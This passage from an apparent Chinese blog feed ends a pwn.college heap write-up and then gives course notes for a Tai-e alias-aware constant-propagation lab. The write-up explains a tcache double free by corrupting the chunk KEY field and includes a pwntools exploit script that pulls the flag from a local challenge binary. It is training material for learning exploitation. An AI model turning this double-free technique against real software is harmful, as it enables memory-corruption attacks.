0)形成了0，1的单链表，read_flag 的第二次会写入 flag，所以写到了1里面，free 反过来就是写到0里面</span><br>    text = p.recv()<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&quot;pwn&quot;</span> <span class="hljs-keyword">in</span> text:<br>        success(text[text.find(<span class="hljs-string">b&quot;pwn.college&#123;&quot;</span>):-<span class="hljs-number">1</span>])<br></code></pre></td></tr></table></figure><h2 id="level4"><a class="markdownIt-Anchor" href="#level4"></a> level4</h2><p>​这里就是对于 tchache 的 double free，因为一个 chunk 被 free之后，它产生的 bin 的 data[1]-&gt;KEY 位置存储着 tchache 的地址，防止double free，所以对于一个bin，如果破环了它的KEY，那么就可以造成 double free，然后在题目中产生了两个bin供read_flag来使用。所以题目使用 scanf 来写入数据到 ptr，因为返回的指针指向数据区data，所以写入 &gt;0x8 字节的数据就可以修改KEY了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> glob<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span> , os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>binary = glob.glob(<span class="hljs-string">&quot;/challenge/babyheap_level[0-9].[0-9]&quot;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]<br><br><span class="hljs-comment"># 堆的板子，可以快速调用</span><br>it = <span class="hljs-keyword">lambda</span>: io.interactive()<br>ru = <span class="hljs-keyword">lambda</span> x: io.recvuntil(x)<br>rud = <span class="hljs-keyword">lambda</span> x: io.recvuntil(x, drop=<span class="hljs-literal">True</span>)<br>r = <span class="hljs-keyword">lambda</span> x: io.recv(x)<br>rl = <span class="hljs-keyword">lambda</span>: io.recvline()<br>rld = <span class="hljs-keyword">lambda</span>: io.recvline(keepends=<span class="hljs-literal">False</span>)<br>s = <span class="hljs-keyword">lambda</span> x: io.send(x)<br>sa = <span class="hljs-keyword">lambda</span> x, y: io.sendafter(x, y)<br>sl = <span class="hljs-keyword">lambda</span> x: io.sendline(x)<br>sla = <span class="hljs-keyword">lambda</span> x, y: io.sendlineafter(x, y)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">malloc</span>(<span class="hljs-params">size</span>):<br>    sla(<span class="hljs-string">b&quot;): &quot;</span>, <span class="hljs-string">b&#x27;malloc&#x27;</span>)<br>    sla(<span class="hljs-string">b&quot;Size: &quot;</span>, <span class="hljs-built_in">str</span>(size).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>():<br>    sla(<span class="hljs-string">b&quot;): &quot;</span>, <span class="hljs-string">b&#x27;free&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read_flag</span>():<br>    sla(<span class="hljs-string">b&quot;): &quot;</span>, <span class="hljs-string">b&#x27;read_flag&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">puts</span>():<br>    sla(<span class="hljs-string">b&quot;): &quot;</span>, <span class="hljs-string">b&#x27;puts&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">scanf</span>(<span class="hljs-params">data</span>):<br>    sla(<span class="hljs-string">b&quot;): &quot;</span>, <span class="hljs-string">b&#x27;scanf&#x27;</span>)<br>    sla(<span class="hljs-string">b&quot;allocations[0])&quot;</span>, data.encode())<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    elf = ELF(binary[<span class="hljs-number">0</span>])<br>    io = process(binary[<span class="hljs-number">0</span>])<br>    malloc(<span class="hljs-number">164</span>)<br>    free()<br>    scanf(<span class="hljs-string">&quot;123412341&quot;</span>)<br>    free()<br>    read_flag()<br>    puts()<br>    text = io.recv()<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&quot;pwn&quot;</span> <span class="hljs-keyword">in</span> text:<br>        success(text[text.find(<span class="hljs-string">b&quot;pwn.college&#123;&quot;</span>):-<span class="hljs-number">1</span>])<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Pwn笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>《软件分析》Lab7</title>
    <link href="/posts/ebddcbac.html"/>
    <url>/posts/ebddcbac.html</url>
    
    <content type="html"><![CDATA[<h1 id="相关配置"><a class="markdownIt-Anchor" href="#相关配置"></a> 相关配置</h1><h2 id="java配置"><a class="markdownIt-Anchor" href="#java配置"></a> java配置</h2><ol><li>设置 <code>Settings -&gt; Project Structure -&gt; SDK: java17 -- Language level: 17 - Sealed types, always-strict floating-point semantics</code></li><li>设置 <code>Settings -&gt; Build,Execution,Deployment -&gt; Gradle -&gt; Build and run using: interlliJ IDEA(下面那个也一样)</code></li></ol><h2 id="dot-png"><a class="markdownIt-Anchor" href="#dot-png"></a> dot-&gt;png</h2><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dos">dot -Tpng <span class="hljs-built_in">tree</span>.dot -o <span class="hljs-built_in">tree</span>.png<br># 其中<span class="hljs-built_in">tree</span>.dot为dot形式名称，<span class="hljs-built_in">tree</span>.png为图片png形式名称<br></code></pre></td></tr></table></figure><h1 id="lab7"><a class="markdownIt-Anchor" href="#lab7"></a> Lab7</h1><h2 id="理解"><a class="markdownIt-Anchor" href="#理解"></a> 理解</h2><p>​这里就是要实现一个 alias-aware 的过程间常量传播分析。我们知道常量传播在 Lab2 喝 Lab4 中都出现过，这里就是分析新的情况，在别名情况下的过程间指针分析。</p><h2 id="题目相关"><a class="markdownIt-Anchor" href="#题目相关"></a> 题目相关</h2><ul><li>为 Java 实现一个 alias-aware 的过程间常量传播分析</li></ul><h2 id="alias-aware-常量传播"><a class="markdownIt-Anchor" href="#alias-aware-常量传播"></a> Alias-Aware 常量传播</h2><h3 id="analysis"><a class="markdownIt-Anchor" href="#analysis"></a> analysis</h3><ul><li><code>pascal.taie.analysis.pta.PointerAnalysisResult</code><ul><li>该类提供了一系列查询指针分析结果的 API，提供有上下文敏感喝非敏感的 API，由于过程间常量传播不需要知道指针分析结果中的上下文信息，所以应该使用不带上下文的指针分析结果</li></ul></li></ul><h3 id="ir"><a class="markdownIt-Anchor" href="#ir"></a> ir</h3><ul><li><code>pascal.taie.ir.exp.ArrayAccess</code><ul><li>该类代表了数组访问表达式，例如 <code>a[i]</code>，该类的实例在类 <code>StoreArray</code> 和 <code>LoadArray</code> 的实例中出现。</li></ul></li></ul><h3 id="具体代码"><a class="markdownIt-Anchor" href="#具体代码"></a> 具体代码</h3><h4 id="代码总览"><a class="markdownIt-Anchor" href="#代码总览"></a> 代码总览</h4><p>​需要完成以下的类，分别为<code>InterConstantPropagation</code>的6个API和<code>InterSolver</code>的2个API</p><ul><li><code>boolean transferCallNode(Stmt,CPFact,CPFact)</code></li><li><code>boolean transferNonCallNode(Stmt,CPFact,CPFact)</code></li><li><code>CPFact transferNormalEdge(NormalEdge,CPFact)</code></li><li><code>CPFact transferCallToReturnEdge(CallToReturnEdge,CPFact)</code></li><li><code>CPFact transferCallEdge(LocalEdge,CPFact)</code></li><li><code>CPFact transferReturnEdge(LocalEdge,CPFact)</code></li><li><code>void initialize()</code></li><li><code>void doSolve()</code></li></ul><h4 id="initialize"><a class="markdownIt-Anchor" href="#initialize"></a> initialize</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 用于保存每个变量的别名，base -&gt; (var1, vat2...)</span><br>   <span class="hljs-keyword">private</span> Map&lt;Var, HashSet&lt;Var&gt;&gt; allVarAliases;<br>   <span class="hljs-comment">// 用于保存静态的 Store 和 Load</span><br>   <span class="hljs-keyword">private</span> Map&lt;JField, HashSet&lt;StoreField&gt;&gt; staticFieldStore;<br>   <span class="hljs-keyword">private</span> Map&lt;JField, HashSet&lt;LoadField&gt;&gt; staticFieldLoad;<br><br><span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">initialize</span><span class="hljs-params">()</span> &#123;<br>       <span class="hljs-type">String</span> <span class="hljs-variable">ptaId</span> <span class="hljs-operator">=</span> getOptions().getString(<span class="hljs-string">&quot;pta&quot;</span>);<br>       <span class="hljs-type">PointerAnalysisResult</span> <span class="hljs-variable">pta</span> <span class="hljs-operator">=</span> World.get().getResult(ptaId);<br>       <span class="hljs-comment">// You can do initialization work here</span><br>       <span class="hljs-comment">// 这里存储每个变量的别名信息，base -&gt; (var1, vat2...)</span><br>       allVarAliases = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>       <span class="hljs-keyword">for</span> (Var base : pta.getVars()) &#123;<br>           <span class="hljs-keyword">for</span> (Var otherVar : pta.getVars()) &#123;  <span class="hljs-comment">// 遍历所有的 var，查看 PointsToSet 存在交集的情况设置别名</span><br>               Set&lt;Obj&gt; basePointsToSet = pta.getPointsToSet(base);<br>               <span class="hljs-keyword">if</span> (basePointsToSet.isEmpty()) <span class="hljs-keyword">continue</span>;<br>               basePointsToSet.forEach(baseObj -&gt; &#123;<br>                   <span class="hljs-comment">// 对于 basePointsToSet，若是其中的 baseObj 被 otherVar 的 PointsToSet 所包含</span><br>                   <span class="hljs-comment">// 即二者 PointsToSet存在交集，则认为 otherVar 为 base 的一个别名</span><br>                   <span class="hljs-keyword">if</span> (pta.getPointsToSet(otherVar).contains(baseObj)) &#123;<br>                       HashSet&lt;Var&gt; baseAliases = allVarAliases.getOrDefault(base, <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>&lt;&gt;());<br>                       baseAliases.add(otherVar);<br>                       allVarAliases.put(base, baseAliases);<br>                   &#125;<br>               &#125;);<br>           &#125;<br>       &#125;<br><br>       <span class="hljs-comment">// 这里存储静态字段的别名信息，由于它只存在 T.f 一种</span><br>       staticFieldStore = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>       staticFieldLoad = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>       icfg.forEach(stmt -&gt; &#123;<br>           <span class="hljs-comment">// 这里静态字段的 jField 都是相同的，所以这里遍历 icfg 中的相同的静态调用作为别名</span><br>           <span class="hljs-keyword">if</span> (stmt <span class="hljs-keyword">instanceof</span> StoreField storeField &amp;&amp; storeField.isStatic()) &#123;<br>               <span class="hljs-type">JField</span> <span class="hljs-variable">jField</span> <span class="hljs-operator">=</span> storeField.getFieldRef().resolve();<br>               HashSet&lt;StoreField&gt; storeFields = staticFieldStore.getOrDefault(jField, <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>&lt;&gt;());<br>               storeFields.add(storeField);<br>               staticFieldStore.put(jField, storeFields);<br>           &#125;<br>           <span class="hljs-keyword">if</span> (stmt <span class="hljs-keyword">instanceof</span> LoadField loadField &amp;&amp; loadField.isStatic()) &#123;<br>               <span class="hljs-type">JField</span> <span class="hljs-variable">jField</span> <span class="hljs-operator">=</span> loadField.getFieldRef().resolve();<br>               HashSet&lt;LoadField&gt; loadFields = staticFieldLoad.getOrDefault(jField, <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>&lt;&gt;());<br>               loadFields.add(loadField);<br>               staticFieldLoad.put(jField, loadFields);<br>           &#125;<br>       &#125;);<br>   &#125;<br></code></pre></td></tr></table></figure><p>​这里主要是添加 <code>allVarAliases</code>，<code>staticFieldStore</code> 和 <code>staticFieldLoad</code> 三个数组，前者通过遍历所有的 var，查看不同指针的指针集是否存在交集而构建别名信息的表 <code>Map&lt;Var, HashSet&lt;Var&gt;&gt;</code>，后两者则是由于是静态字段，它没有别名，所以直接遍历 <code>icfg</code> 添加相应的 store 和 load 语句即可，以便后续的使用。</p><h4 id="isarrayindexalias"><a class="markdownIt-Anchor" href="#isarrayindexalias"></a> isArrayIndexAlias</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isArrayIndexAlias</span><span class="hljs-params">(Value indexI, Value indexJ)</span> &#123;<br>       <span class="hljs-type">boolean</span> <span class="hljs-variable">isAlias</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;<br>       <span class="hljs-keyword">if</span> ((indexI.isConstant() &amp;&amp; indexJ.isConstant()) &amp;&amp; indexI.getConstant() == indexJ.getConstant()) &#123;<br>           isAlias = <span class="hljs-literal">true</span>;<br>       &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (indexI.isNAC() &amp;&amp; (indexJ.isNAC() || indexJ.isConstant())) &#123;<br>           isAlias = <span class="hljs-literal">true</span>;<br>       &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (indexJ.isNAC() &amp;&amp; (indexI.isNAC() || indexI.isConstant())) &#123;<br>           isAlias = <span class="hljs-literal">true</span>;<br>       &#125;<br>       <span class="hljs-keyword">return</span> isAlias;<br>   &#125;<br></code></pre></td></tr></table></figure><p>​这里就是对于数组 a,b 的指针集有交集的情况下，根据常量传播中的 i 和 j 的结果来决定 a[i] 和 b[i] 是否为别名。对应的就是下面的表格。</p><table><thead><tr><th style="text-align:center"><code>a[i] and b[j]</code></th><th style="text-align:center"><code>j = UNDEF</code></th><th style="text-align:center"><code>j = </code> c2</th><th style="text-align:center"><code>j = NAC</code></th></tr></thead><tbody><tr><td style="text-align:center"><code>i = UNDEF</code></td><td style="text-align:center">不互为别名</td><td style="text-align:center">不互为别名</td><td style="text-align:center">不互为别名</td></tr><tr><td style="text-align:center"><code>i = </code> c1</td><td style="text-align:center">不互为别名</td><td style="text-align:center">当且仅当 c1=c2 时互为别名</td><td style="text-align:center">互为别名</td></tr><tr><td style="text-align:center"><code>i = NAC</code></td><td style="text-align:center">不互为别名</td><td style="text-align:center">互为别名</td><td style="text-align:center">互为别名</td></tr></tbody></table><h4 id="transfercallnode"><a class="markdownIt-Anchor" href="#transfercallnode"></a> transferCallNode</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">protected</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">transferNonCallNode</span><span class="hljs-params">(Stmt stmt, CPFact in, CPFact out)</span> &#123;<br>       <span class="hljs-comment">// TODO - finish me</span><br>       <span class="hljs-type">CPFact</span> <span class="hljs-variable">copyIn</span> <span class="hljs-operator">=</span> in.copy();<br>       <span class="hljs-keyword">if</span> (stmt <span class="hljs-keyword">instanceof</span> AssignStmt&lt;?, ?&gt; assignStmt) &#123;<br>           <span class="hljs-type">LValue</span> <span class="hljs-variable">lValue</span> <span class="hljs-operator">=</span> assignStmt.getLValue();<br>           DataflowResult&lt;Stmt, CPFact&gt; dataflowResult = solver.getResult();<br>           <span class="hljs-comment">// 这里设置为 Undef，可以在 meetValue 中直接赋值为第二个 Value 的值</span><br>           <span class="hljs-type">Value</span> <span class="hljs-variable">resValue</span> <span class="hljs-operator">=</span> Value.getUndef();<br>           <span class="hljs-comment">// 这里使用 canHoldInt 进行判断时只用对 load 进行判断，之前对于 load 和 store 都进行判断会跳过某些处理而不能通过样例</span><br>           <span class="hljs-keyword">if</span> (stmt <span class="hljs-keyword">instanceof</span> LoadField loadField &amp;&amp; lValue <span class="hljs-keyword">instanceof</span> Var lVar &amp;&amp; ConstantPropagation.canHoldInt(lVar)) &#123;<br>               <span class="hljs-comment">// 处理 loadField 语句，把对应的 store 的 rhs 用 meet 计算出来，赋给 load 的 lhs</span><br>               <span class="hljs-type">JField</span> <span class="hljs-variable">jField</span> <span class="hljs-operator">=</span> loadField.getFieldRef().resolve();<br>               <span class="hljs-keyword">if</span> (loadField.isStatic()) &#123;   <span class="hljs-comment">// 静态字段的load，直接在 staticFieldStore 获取别名然后进行 meetValue 操作</span><br>                   HashSet&lt;StoreField&gt; storeFields = staticFieldStore.getOrDefault(jField, <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>&lt;&gt;());<br>                   <span class="hljs-keyword">for</span> (StoreField storeField : storeFields) &#123;<br>                       resValue = cp.meetValue(resValue, dataflowResult.getOutFact(storeField).get(storeField.getRValue()));<br>                   &#125;<br>               &#125; <span class="hljs-keyword">else</span> &#123;   <span class="hljs-comment">// 实例字段的load，则是根据对象 base 来在 allVarAliases 寻找别名，将对该对象的 store 操作进行 meetValue</span><br>                   <span class="hljs-type">Var</span> <span class="hljs-variable">base</span> <span class="hljs-operator">=</span> ((InstanceFieldAccess) loadField.getFieldAccess()).getBase();<br>                   <span class="hljs-keyword">for</span> (Var <span class="hljs-keyword">var</span> : allVarAliases.getOrDefault(base, <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>&lt;&gt;())) &#123;<br>                       <span class="hljs-keyword">for</span> (StoreField storeField : <span class="hljs-keyword">var</span>.getStoreFields()) &#123;<br>                           <span class="hljs-keyword">if</span> (jField == storeField.getFieldRef().resolve()) &#123;<br>                               resValue = cp.meetValue(resValue, dataflowResult.getOutFact(storeField).get(storeField.getRValue()));<br>                           &#125;<br>                       &#125;<br>                   &#125;<br>               &#125;<br>               <span class="hljs-comment">// 若是满足 load 的条件，对 copyIn 进行更新，所以下面与 out 比较的判断因为存在改动而返回 true</span><br>               <span class="hljs-keyword">if</span>(resValue != Value.getUndef())&#123;<br>                   copyIn.update(lVar, resValue);<br>               &#125;<br>               <span class="hljs-keyword">return</span> out.copyFrom(copyIn);<br>           &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (stmt <span class="hljs-keyword">instanceof</span> StoreField storeField) &#123;<br>               <span class="hljs-comment">// 判断 y.f 的值是否有变化，有变化就把对应的 load 加入到 WorkList 中，其余按照过程内常量传播处理</span><br>               <span class="hljs-type">boolean</span> <span class="hljs-variable">isChange</span> <span class="hljs-operator">=</span> cp.transferNode(stmt, in, out);<br>               <span class="hljs-keyword">if</span> (isChange) &#123;<br>                   <span class="hljs-keyword">if</span> (storeField.isStatic()) &#123;<br>                       <span class="hljs-type">JField</span> <span class="hljs-variable">jField</span> <span class="hljs-operator">=</span> storeField.getFieldRef().resolve();<br>                       <span class="hljs-comment">// 提取 staticFieldLoad 中 jField 的别名的 loadField 操作，然后加入 solver 的 WorkList</span><br>                       HashSet&lt;LoadField&gt; loadFields = staticFieldLoad.getOrDefault(jField, <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>&lt;&gt;());<br>                       loadFields.forEach(loadField -&gt; &#123;<br>                           solver.addWorkList(loadField);<br>                       &#125;);<br>                   &#125; <span class="hljs-keyword">else</span> &#123;<br>                       <span class="hljs-type">Var</span> <span class="hljs-variable">base</span> <span class="hljs-operator">=</span> ((InstanceFieldAccess) storeField.getFieldAccess()).getBase();<br>                       <span class="hljs-keyword">for</span> (Var <span class="hljs-keyword">var</span> : allVarAliases.getOrDefault(base, <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>&lt;&gt;())) &#123;<br>                           <span class="hljs-keyword">var</span>.getLoadFields().forEach(loadField -&gt; &#123;<br>                               solver.addWorkList(loadField);<br>                           &#125;);<br>                       &#125;<br>                   &#125;<br>               &#125;<br>               <span class="hljs-comment">// 这里 StoreField 和 StoreArray 都加上这里的 return 才可以通过样例，而之前通过最后的 return 返回就是错的</span><br>               <span class="hljs-comment">// 由此认为 Store 语句的 cp.transferNode 的处理在 if 语句块中进行处理，而最后的 return 则是直接返回了 copyFrom 的结果，两者是不同的</span><br>               <span class="hljs-keyword">return</span> isChange;<br>           &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (stmt <span class="hljs-keyword">instanceof</span> LoadArray loadArray &amp;&amp; lValue <span class="hljs-keyword">instanceof</span> Var lVar &amp;&amp; ConstantPropagation.canHoldInt(lVar)) &#123;<br>               <span class="hljs-comment">// load 的操作一样，寻找别名的 store 操作，然后把 store 的 rhs meet 计算，赋值给 load 的 lhs</span><br>               <span class="hljs-type">Var</span> <span class="hljs-variable">base</span> <span class="hljs-operator">=</span> loadArray.getArrayAccess().getBase();<br>               <span class="hljs-type">Value</span> <span class="hljs-variable">loadIndexValue</span> <span class="hljs-operator">=</span> in.get(loadArray.getArrayAccess().getIndex());<br>               <span class="hljs-keyword">for</span> (Var <span class="hljs-keyword">var</span> : allVarAliases.getOrDefault(base, <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>&lt;&gt;())) &#123;<br>                   <span class="hljs-keyword">for</span> (StoreArray storeArray : <span class="hljs-keyword">var</span>.getStoreArrays()) &#123;<br>                       <span class="hljs-type">Value</span> <span class="hljs-variable">storeIndexValue</span> <span class="hljs-operator">=</span> dataflowResult.getInFact(storeArray).get(storeArray.getArrayAccess().getIndex());<br>                       <span class="hljs-keyword">if</span> (isArrayIndexAlias(loadIndexValue, storeIndexValue)) &#123;<br>                           resValue = cp.meetValue(resValue, dataflowResult.getOutFact(storeArray).get(storeArray.getRValue()));<br>                       &#125;<br>                   &#125;<br>               &#125;<br>               <span class="hljs-keyword">if</span>(resValue != Value.getUndef())&#123;<br>                   copyIn.update(lVar, resValue);<br>               &#125;<br>               <span class="hljs-keyword">return</span> out.copyFrom(copyIn);<br>           &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (stmt <span class="hljs-keyword">instanceof</span> StoreArray storeArray) &#123;<br>               <span class="hljs-type">boolean</span> <span class="hljs-variable">isChange</span> <span class="hljs-operator">=</span> cp.transferNode(stmt, in, out);<br>               <span class="hljs-keyword">if</span> (isChange) &#123;<br>                   <span class="hljs-type">Var</span> <span class="hljs-variable">base</span> <span class="hljs-operator">=</span> storeArray.getArrayAccess().getBase();<br>                   <span class="hljs-keyword">for</span> (Var <span class="hljs-keyword">var</span> : allVarAliases.getOrDefault(base, <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>&lt;&gt;())) &#123;<br>                       <span class="hljs-keyword">var</span>.getLoadArrays().forEach(loadArray -&gt; &#123;<br>                           solver.addWorkList(loadArray);<br>                       &#125;);<br>                   &#125;<br>               &#125;<br>               <span class="hljs-keyword">return</span> isChange;<br>           &#125;<br>       &#125;<br>       <span class="hljs-comment">// 不涉及别名的语句，采用过程内常量分析</span><br>       <span class="hljs-keyword">return</span> cp.transferNode(stmt, in, out);<br>   &#125;<br></code></pre></td></tr></table></figure><p>​这里就是增加对于别名信息的处理，大体上分为 FieldStore，FieldLoad，ArrayStore，ArrayLoad 四种处理，其中前两者存在实例字段和静态字段的区别。对于 load 和 store 的处理就是下面的规则。</p><ul><li>对于 load，把 <strong>对应</strong> 的 store 的 rhs 用 meet 计算出来，赋给 load 的 lhs</li><li>对于 store，若 y.f 的值有变化，把 <strong>对应</strong> 的 load 加入 worklist</li></ul><p>​我自己做的时候需要注意以下两点：</p><ul><li>根据手册中的常量化处理 <code>canHoldInt</code> 来进行操作，但是这只是对于 load 相关语句而言，对于 store 相关语句不需要这个，即不需要判断 <code>a.f</code> 是否为一个常量，如果对于 store 也判断会跳过某些需要处理的样例</li><li>对于 Store 语句的返回需要直接 return。这里我依然不是很明白，上面写的进入的 cp.transferNode 的分支不同，也确实是这样，但是若是对于一个 store 语句而言，没有立即返回而是等到最后才返回的效果应该一样吧，毕竟都是同样的语句。但是这里任意一个的删除都会产生相应的影响，目前的想法是这里如果没有 return isChange，那么就经过了两次 cp.transferNode，第一次确实是处理 store 语句，但是处理后会改变 out 的值，所以第一次和第二次的结果实际上是不同的，因此应该返回第一次处理的结果。</li></ul><h4 id="addworklist"><a class="markdownIt-Anchor" href="#addworklist"></a> addWorkList</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addWorkList</span><span class="hljs-params">(Node node)</span>&#123;<br>       <span class="hljs-keyword">if</span>(!workList.contains(node))&#123;<br>           workList.add(node);<br>       &#125;<br>   &#125;<br></code></pre></td></tr></table></figure><p>​interSolver中添加的，主要服务于上面 store 添加到 worklist 的处理。之后其余的地方都没有改动，直接复制前面 Lab 的代码即可。</p><p>​</p>]]></content>
    
    
    <categories>
      
      <category>静态分析</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>《软件分析》Lab6</title>
    <link href="/posts/9cdafb3a.html"/>
    <url>/posts/9cdafb3a.html</url>
    
